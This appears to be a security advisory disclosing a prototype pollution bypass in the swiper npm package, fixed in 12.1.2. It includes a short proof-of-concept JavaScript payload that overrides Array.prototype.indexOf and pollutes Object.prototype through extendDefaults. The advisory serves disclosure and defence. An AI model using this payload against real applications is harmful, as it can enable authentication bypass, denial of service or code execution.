summary: "Prototype pollution in swiper\n### Summary\nA prototype pollution vulnerability exists\
  \ in the the npm package swiper (>=6.5.1, < 12.1.2). Despite a previous fix that attempted\
  \ to mitigate prototype pollution by checking whether user input contained a forbidden key,\
  \ it is still possible to pollute `Object.prototype` via a crafted input using Array.prototype.\
  \ The exploit works across Windows and Linux and on Node and Bun runtimes. This issue is fixed\
  \ in version 12.1.2\n\n### Details\nThe vulnerability resides in line 94 of shared/utils.mjs\
  \ where indexOf() function is used to check whether user provided input contain forbidden\
  \ strings.\n\n### PoC\n#### Steps to reproduce\n1. Install latest version of swiper using\
  \ npm install \n2. Run the following code snippet:\n```javascript\nvar swiper = require('swiper');\n\
  Array.prototype.indexOf = () => -1;        \nlet obj = {};\nvar malicious_payload = '{\"__proto__\"\
  :{\"polluted\":\"yes\"}}';\nconsole.log({}.polluted);\nswiper.default.extendDefaults(JSON.parse(malicious_payload));\n\
  console.log({}.polluted);  // prints yes -> indicating that the patch was bypassed and prototype\
  \ pollution occurred\n```\n\n#### Expected behavior\nPrototype pollution should be prevented\
  \ and {} should not gain new properties.\nThis should be printed on the console:\n```\nundefined\n\
  undefined OR throw an Error\n```\n\n#### Actual behavior\nObject.prototype is polluted\nThis\
  \ is printed on the console:\n```\nundefined \nyes\n```\n\n### Impact\nThis is a prototype\
  \ pollution vulnerability, which can have severe security implications depending on how swiper\
  \ is used by downstream applications. Any application that processes attacker-controlled input\
  \ using this package may be affected.\nIt could potentially lead to the following problems:\n\
  1. Authentication bypass\n2. Denial of service - Even if an attacker is not able to exploit\
  \ prototype pollution in swiper, if there is a prototype pollution within the project from\
  \ other dependencies, modifying global `Array.prototype.indexOf` property can result in crash\
  \ when swiper.default.extendDefaults is called because swiper makes use of this global property.\
  \ This can lead to Denial of Service.  \n3. Remote code execution (if polluted property is\
  \ passed to sinks like eval or child_process)\n\n### Related CVEs\n[CVE-2026-25521](https://github.com/advisories/GHSA-rxrv-835q-v5mh)\n\
